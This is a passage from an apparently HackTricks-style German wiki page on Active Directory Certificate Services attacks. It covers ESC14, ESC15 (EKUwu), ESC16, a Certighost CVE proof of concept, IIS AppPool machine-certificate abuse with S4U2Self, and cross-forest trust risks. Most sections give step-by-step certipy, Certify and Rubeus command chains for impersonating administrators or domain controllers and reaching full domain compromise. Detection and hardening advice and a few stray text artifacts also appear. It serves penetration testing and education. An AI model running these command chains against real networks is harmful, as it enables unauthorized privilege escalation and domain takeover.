- **Voraussetzung**: Das Zielkonto hat eine schwache explizite X509IssuerSubject-Zuordnung in `altSecurityIdentities`. Der Angreifer kann das Attribut `cn` oder `dNSHostName` eines Opfer-Principals so setzen, dass es dem Subject der X509IssuerSubject-Zuordnung des Zielkontos entspricht. Anschließend kann der Angreifer als Opfer ein Zertifikat beantragen und dieses Zertifikat verwenden, um sich als Zielkonto zu authentifizieren.
#### Szenario D: Zielkonto hat eine X509SubjectOnly-Zuordnung

- **Voraussetzung**: Das Zielkonto hat eine schwache explizite X509SubjectOnly-Zuordnung in `altSecurityIdentities`. Der Angreifer kann das Attribut `cn` oder `dNSHostName` eines Opfer-Principals so setzen, dass es dem Subject der X509SubjectOnly-Zuordnung des Zielkontos entspricht. Anschließend kann der Angreifer als Opfer ein Zertifikat beantragen und dieses Zertifikat verwenden, um sich als Zielkonto zu authentifizieren.
### Konkrete Aktionen
#### Szenario A

Beantrage ein Zertifikat der Zertifikatvorlage `Machine`】【。

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Speichern und das Zertifikat konvertieren

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Authentifizieren (mit dem Zertifikat)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Bereinigung (optional)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Für spezifischere Angriffsmethoden in verschiedenen Angriffsszenarien siehe: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Erklärung

Die [ursprüngliche ESC15-Forschung](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) erklärt, wie Application Policies, die in einer Anforderung für ein V1-Template angegeben werden, die konfigurierte Extended Key Usage auf einer **ungepatchten ausstellenden CA** überschreiben können.<sup>[[15]](#references)</sup> Ein möglicher Angreifer benötigt außerdem ein veröffentlichtes, für die Registrierung freigegebenes Template, das die erforderlichen Betreff-/Anforderungseigenschaften zulässt und keine blockierende Genehmigungs- oder Signaturvoraussetzung hat. Registrierungsrechte allein belegen nicht, dass die Schwachstelle ausgenutzt werden kann. Die Nutzung eines Certificate Request Agent kann zusätzlich von einem geeigneten zweiten Template und Einschränkungen für Registrierungsagenten abhängen. Überprüfen Sie den Patch-Status der CA und das Ausstellungsergebnis, bevor Sie diesen Angriffsweg als möglich einstufen.

### Ausnutzung

Die [Dokumentation zur Rechteausweitung mit Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) enthält detailliertere Anwendungsbeispiele.<sup>[[14]](#references)</sup>


Certipys Befehl `find` kann dabei helfen, V1-Templates zu identifizieren, die potenziell anfällig für ESC15 sind, wenn die CA ungepatcht ist.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Szenario A: Direkte Identitätsübernahme über Schannel

**Schritt 1: Ein Zertifikat anfordern und dabei die Application Policy „Client Authentication“ sowie die UPN des Ziels einfügen.** Der Angreifer `attacker@corp.local` nimmt `administrator@corp.local` mit der Vorlage „WebServer“ V1 ins Visier (die ein vom Anfordernden angegebenes Subjekt zulässt).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Die verwundbare V1-Vorlage mit „Enrollee supplies subject“.
- `-application-policies 'Client Authentication'`: Fügt die OID `1.3.6.1.5.5.7.3.2` in die Erweiterung „Application Policies“ des CSR ein.
- `-upn 'administrator@corp.local'`: Legt den UPN im SAN für die Identitätsübernahme fest.

**Schritt 2: Über Schannel (LDAPS) mit dem erhaltenen Zertifikat authentifizieren.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Szenario B: PKINIT/Kerberos-Impersonation via Enrollment Agent Abuse

**Schritt 1: Ein Zertifikat von einem V1-Template anfordern (mit „Enrollee supplies subject“) und dabei die Application Policy „Certificate Request Agent“ einschleusen.** Dieses Zertifikat ist für den Angreifer (`attacker@corp.local`) bestimmt, damit er als Enrollment Agent fungieren kann. Für die eigene Identität des Angreifers wird hier kein UPN angegeben, da es um die Agent-Funktion geht.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Fügt die OID `1.3.6.1.4.1.311.20.2.1` ein.

**Schritt 2: Verwende das „agent“-Zertifikat, um im Namen eines privilegierten Zielbenutzers ein Zertifikat anzufordern.** Dieser Schritt ähnelt ESC3 und verwendet das Zertifikat aus Schritt 1 als Agentenzertifikat.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Schritt 3: Authentifizieren Sie sich als privilegierter Benutzer mit dem „on-behalf-of“-Zertifikat.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Sicherheits-Erweiterung auf der CA deaktiviert (global)-ESC16

### Erklärung

**ESC16 (E Rechteausweitung durch fehlende szOID_NTDS_CA_SECURITY_EXT-Erweiterung)** beschreibt die CA-weite Unterdrückung der SID-Erweiterung **szOID_NTDS_CA_SECURITY_EXT**. Dies ist ein Konfigurationsindikator und kein Beweis dafür, dass sich ein Zertifikat als ein anderes Konto authentifizieren kann. Für eine Identitätsübernahme sind außerdem die Kontrolle über die relevanten Kontoattribute oder das Mapping, eine enrollbare Client-Authentifizierungsvorlage und ein Zertifikat-Mapping-Pfad erforderlich, der vom tatsächlichen Domänencontroller oder Dienst akzeptiert wird. Ein gepatchter KDC im Full-Enforcement-Modus lehnt Zertifikate ohne SID-Erweiterung ab, sofern sie kein anderes starkes Mapping aufweisen. Das folgende UPN-only-Kerberos-Verfahren gilt für ältere KDCs oder KDCs im Kompatibilitätsmodus, die weiterhin schwaches Mapping akzeptieren. Siehe [Microsofts Anleitung zu Zertifikat-Mapping und Erzwingung](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Weitere Informationen zu den Details des Prinzips finden Sie in diesem Artikel:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Ausnutzung

Das folgende historische UPN-only-Kerberos-Beispiel basiert auf [Certipys ESC16-Dokumentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Es erfordert einen KDC, der das resultierende schwache Mapping weiterhin akzeptiert. `StrongCertificateBindingEnforcement=1` ist nach dem Windows-Sicherheitsupdate vom 9. September 2025 keine unterstützte Umgehung mehr.<sup>[[14]](#references)</sup>

Um festzustellen, ob die Active Directory Certificate Services (AD CS)-Umgebung für **ESC16** anfällig ist:

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Schritt 1: Ursprünglichen UPN des Opferkontos auslesen (optional - zur Wiederherstellung).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Schritt 2: Aktualisiere den UPN des Opferkontos auf den `sAMAccountName` des Zieladministrators.  JSImport  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Schritt 3: (Falls erforderlich) Zugangsdaten für das „Opfer“-Konto beschaffen (z. B. über Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Schritt 4: Fordern Sie als „Opfer“-Benutzer ein Zertifikat von einer Client-Authentifizierungsvorlage an, für die das Konto auf der mit ESC16 konfigurierten CA registriert werden kann (z. B. „User“).** Die CA lässt die SID-Sicherheitserweiterung im ausgestellten Zertifikat weg, aber dadurch allein wird noch kein verwendbares Authentifizierungs-Mapping hergestellt. Setzen Sie die Umgebungsvariable für den Kerberos-Anmeldeinformationscache (Shell-Befehl):

```bash
export KRB5CCNAME=victim.ccache
```

Dann das Zertifikat anfordern:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Schritt 5: Setze den UPN des „victim“-Kontos zurück.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Schritt 6: Authentifizieren Sie sich auf einem älteren KDC oder einem KDC im Kompatibilitätsmodus, der dieses schwache Mapping akzeptiert, als Zieladministrator.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Identitätsersetzung durch Rogue-LDAP/LSA-Chase-Callback (Certighost / CVE-2026-54121)

### Erklärung

**Certighost** missbraucht einen **AD-CS-Enrollment-Chase-/Callback-Pfad**, bei dem die CA vom Anfragenden bereitgestellte Anforderungsattribute verwendet, um die Identität zu bestimmen, die in das ausgestellte Zertifikat aufgenommen werden soll. Im öffentlichen PoC enthält die präparierte Anfrage:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: vom Angreifer kontrollierter Host/IP, den die CA kontaktiert
- **`rmd`**: der **DNS-Name des Zieldomänencontrollers**, der imitiert werden soll

Wenn die CA diesem Chase folgt, verbindet sie sich über **SMB/LSA (`445`)** und **LDAP (`389`)** mit dem Angreifer. Der Angreifer verwendet ein **echtes Computerkonto** (das üblicherweise über das standardmäßige **`ms-DS-MachineAccountQuota`** erstellt wird), sodass die Callback-Sitzung sich als gültiger Domänenprincipal authentifiziert. Die Rogue-Dienste geben jedoch stattdessen die Identitätsattribute des **Ziel-DCs** zurück:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Wenn die CA die zurückgegebene Identität **nicht kryptografisch an den authentifizierten Callback-Principal bindet**, kann sie ein Zertifikat für den **Domänencontroller** ausstellen, obwohl sich die Sitzung mit dem vom Angreifer kontrollierten Computerkonto authentifiziert hat. Dadurch unterscheidet sich der Bug konzeptionell von **Certifried**: Statt AD-Attribute wie `dNSHostName` umzuschreiben, **ersetzt der Angreifer Identitätsdaten während der Callback-Auflösung durch die CA**.<sup>[[2]](#references)</sup>

**Nützliche Voraussetzungen:**

- Niedrig privilegierte **Domänenanmeldedaten**
- Möglichkeit, ein Computerkonto **zu erstellen oder wiederzuverwenden**
- Netzwerkverbindung von der **CA** zu den vom Angreifer kontrollierten **Ports `389` und `445`**
- Verwundbarer / nicht gepatchter CA-Anfragepfad (das Microsoft-Update vom **14. Juli 2026** ergänzte eine **DC-Validierung für `cdc`** sowie einen **Vergleich der aufgelösten SIDs**)

Die resultierende **`.pfx`** kann anschließend für **PKINIT** verwendet werden. Dabei entstehen eine **`.ccache`** und im veröffentlichten PoC-Ablauf der **NT-Hash des Ziel-DCs**. Das reicht normalerweise für die **vollständige Kompromittierung der Domäne**.

### Missbrauch

Der öffentliche PoC automatisiert die gesamte Angriffskette:<sup>[[1]](#references)</sup>

1. Ein vom Angreifer kontrolliertes **Computerkonto** erstellen oder wiederverwenden.
2. **Rogue-LDAP- und SMB/LSA-Listener** auf `389` und `445` starten.
3. Eine Zertifikatsanfrage mit den vom Angreifer kontrollierten Attributen **`cdc`** und **`rmd`** senden.
4. Die CA sich bei den Rogue-Listenern als das kontrollierte Computerkonto authentifizieren lassen, aber die Identitätsabfragen mit den Attributen des **Ziel-DCs** beantworten.
5. Ein von der CA signiertes **DC-Zertifikat** erhalten und anschließend für **PKINIT** verwenden.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Nützliche Runtime-Flags aus dem PoC:

- `--listener <ip>`: explizit die Callback-IP auswählen, die in `cdc` angekündigt wird
- `--computer-name <NAME$>`: ein bestehendes Computerkonto wiederverwenden, statt ein neues zu erstellen

**Betriebshinweise:**

- Der PoC benötigt **root**, da er an **privilegierte Ports** `389` und `445` bindet.
- Bei erfolgreicher Ausnutzung werden lokal ein **DC `.pfx`** und ein **Kerberos `.ccache`** geschrieben.
- Da das Zertifikat einem **Domain Controller-Konto** zugeordnet ist, können Folgeaktionen **zertifikatbasierte Kerberos-Authentifizierung**, **DCSync** und die Wiederverwendung des erlangten **Machine-NT-Hashes** umfassen.<sup>[[2]](#references)</sup>

## IIS AppPool-Registrierung für Administrator auf demselben Host

Ein IIS-Pool, der als `ApplicationPoolIdentity` ausgeführt wird, verwendet für den ausgehenden Zugriff auf Netzwerkressourcen das **Computerkonto** seines Hosts. Daher bleibt Codeausführung als `IIS AppPool\<POOL>` im lokalen Token niedrig privilegiert, kann aber eine AD CS-Anfrage einreichen, die die CA als `HOST$` authentifiziert; dies ist ein ausgehender Identitätswechsel, keine Token-Impersonation oder lokale Erhöhung nach dem Potato-Prinzip.<sup>[[19]](#references)[[20]](#references)</sup>

Diese Chain erfordert einen domain-joined IIS-Host, eine über RPC erreichbare Enterprise-CA, ein veröffentlichtes Machine-Authentication-Template, für das der Computer Registrierungsrechte hat, PKINIT-Unterstützung sowie KDC-/SMB-Erreichbarkeit. Eine benutzerdefinierte Pool-Identität ändert den ausgehenden Principal. Stelle daher sicher, dass der Pool tatsächlich `ApplicationPoolIdentity` verwendet, bevor du `HOST$` annimmst.<sup>[[19]](#references)[[20]](#references)</sup>

### Registrierung mit einem vom Angreifer kontrollierten Schlüssel

Erzeuge das Schlüsselpaar und den CSR außerhalb des IIS-Servers und bewahre den privaten Schlüssel auf. Reiche vom kompromittierten Worker **nur den CSR** ein. Der [Certi-Bhai-ASPX-PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instanziiert `CertificateAuthority.Request`, setzt `CertificateTemplate:Machine`, ruft `ICertRequest::Submit` auf und gibt das ausgestellte Zertifikat zurück. Verwende den CA-Konfigurationsstring `CAHOST\CA-NAME`; ein normales `Machine`-Template erstellt den Subject aus AD, daher sind vom Requester bereitgestellte Subject-/SAN-Daten nicht erforderlich.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Kombiniere das zurückgegebene Zertifikat mit dem **passenden, aufbewahrten Schlüssel**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` funktioniert nur, wenn Windows das Zertifikat bereits einem zugänglichen privaten Schlüssel zuordnen kann. Bei separaten PEM-Dateien musst du PKCS#12 explizit erstellen:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Verwende die PFX für PKINIT und behalte das zurückgegebene Computer-TGT als base64, anstatt es sofort zu injizieren:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus Dienstsubstitution auf demselben Host

S4U2Self ermöglicht es einem Dienst, ein Ticket **an sich selbst** anzufordern, das die Autorisierungsdaten eines anderen Benutzers enthält. Mit dem Computer-TGT kann Rubeus dieses Ticket für einen privilegierten Benutzer anfordern, den Dienstnamen in der zurückgegebenen KRB-CRED in CIFS ändern und das Ticket injizieren. Dies ist das lokale Prinzip „an dich selbst delegieren“: Es erfordert weder S4U2Proxy noch einen Eintrag für `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Das substituierte Ticket kann nur von Diensten auf **demselben Computerkonto/Schlüssel** verwendet werden (hier CIFS auf `HOST`). Es ist kein wiederverwendbares Administrator-Ticket für andere Domänencomputer. Außerdem zeigt das demonstrierte Ergebnis privilegierten SMB-/Dateisystemzugriff als Administrator; für einen lokalen `NT AUTHORITY\SYSTEM`-Prozess ist weiterhin ein separater Remote-Execution-Schritt erforderlich.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Erkennung und Härtung

- Korrelieren Sie auf der CA die Ereignisse **4886** (Anforderung empfangen) und **4887** (ausgestellt) von Certification Services, um unerwartete Anforderungen von `Machine`-Vorlagen durch IIS-Serverkonten zu erkennen.<sup>[[19]](#references)[[24]](#references)</sup>
- Ereignis **4768** auf DCs enthält Zertifikatsfelder, wenn die Zertifikats-Pre-Authentifizierung verwendet wird; richten Sie Warnmeldungen für ungewöhnliche PKINIT-TGT-Anforderungen von Webserverkonten ein. Achten Sie anschließend auf **4769**-Anforderungen, die eine privilegierte Identität zur Impersonation und denselben Host betreffen. Da Rubeus mit `/altservice` den KRB-CRED-Dienstnamen clientseitig umschreibt, darf der DC-seitige 4769-Dienstname nicht zwingend `cifs` lauten.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Suchen Sie nach `w3wp.exe`-Verbindungen zu CA-RPC-Endpunkten, unerwartet angelegten ASPX-Dateien, Kerberos-authentifiziertem Zugriff auf administrative Freigaben und Aktivitäten zum Auslesen von Secrets. Beschränken Sie nach Möglichkeit den Zugriff der App-Tier auf CA-RPC/KDC/SMB und entfernen Sie Computerregistrierungsrechte oder Machine-Authentifizierungsvorlagen, die betrieblich nicht erforderlich sind.<sup>[[19]](#references)</sup>

## Kompromittierung von Forests mit Zertifikaten in Passivform erklärt

### Aufbrechen von Forest Trusts durch kompromittierte CAs

Die Konfiguration für die **forestübergreifende Registrierung** wird relativ einfach gestaltet. Das **Stamm-CA-Zertifikat** des Ressourcen-Forests wird von Administratoren in den **Account-Forests veröffentlicht**, und die **Enterprise-CA-Zertifikate** des Ressourcen-Forests werden den Containern `NTAuthCertificates` und AIA in jedem Account-Forest **hinzugefügt**. Zur Klarstellung: Diese Konfiguration gewährt der **CA im Ressourcen-Forest die vollständige Kontrolle** über alle anderen Forests, für die sie die PKI verwaltet. Wird diese CA **von Angreifern kompromittiert**, könnten sie Zertifikate für alle Benutzer sowohl im Ressourcen- als auch in den Account-Forests **fälschen** und damit die Sicherheitsgrenze des Forests aufbrechen.<sup>[[6]](#references)</sup>

### Registrierungsrechte für fremde Principals

In Umgebungen mit mehreren Forests ist bei Enterprise-CAs Vorsicht geboten, die **Zertifikatvorlagen veröffentlichen**, welche **Authenticated Users oder fremden Principals** (Benutzern/Gruppen außerhalb des Forests, zu dem die Enterprise-CA gehört) **Registrierungs- und Bearbeitungsrechte** gewähren.\
Bei der Authentifizierung über einen Trust hinweg wird die **Authenticated Users SID** von AD zum Token des Benutzers hinzugefügt. Wenn eine Domäne also über eine Enterprise-CA mit einer Vorlage verfügt, die **Authenticated Users Registrierungsrechte gewährt**, könnte sich ein Benutzer aus einem anderen Forest möglicherweise für eine Vorlage **registrieren**. Ebenso wird durch eine Vorlage, die **einem fremden Principal ausdrücklich Registrierungsrechte gewährt**, eine **forestübergreifende Zugriffssteuerungsbeziehung geschaffen**, die es einem Principal aus einem Forest ermöglicht, sich **für eine Vorlage aus einem anderen Forest zu registrieren**.

Beide Szenarien führen zu einer **Vergrößerung der Angriffsfläche** zwischen Forests. Ein Angreifer könnte die Einstellungen der Zertifikatvorlage ausnutzen, um zusätzliche Rechte in einer fremden Domäne zu erlangen.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC-Repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n – Technische Analyse von Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps-Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Missbrauch von Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound-GUI, neue Authentifizierungs- und Anforderungsmethoden und mehr](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Missbrauch der Key-Trust-Kontozuordnung zur Kontoübernahme](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Die Geschichte der Enhanced-Key-(Fehl-)Verwendung](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying zu AD Certificate Services über RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell-Zugriff auf ADCS-CA mit YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS-ESC13-Missbrauchstechnik](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS-ESC14-Missbrauchstechnik](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy-Wiki – Rechteausweitung (ESC1–ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Nicht nur ein weiterer AD-CS-ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Fehlkonfiguration und Ausnutzung](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – „Delegate 2 Thyself“ erneut betrachtet](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS-AD-CS-Registrierungs-PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Rechteausweitung von IIS AppPool über den AD-CS-RPC-Endpunkt](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Anwendungs-Pool-Identitäten](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12-Befehl](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Services überwachen](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Ereignis 4768: Ein Kerberos-Authentifizierungsticket wurde angefordert](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Ereignis 4769: Ein Kerberos-Dienstticket wurde angefordert](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD-CS-PowerShell-Exploitation-Toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
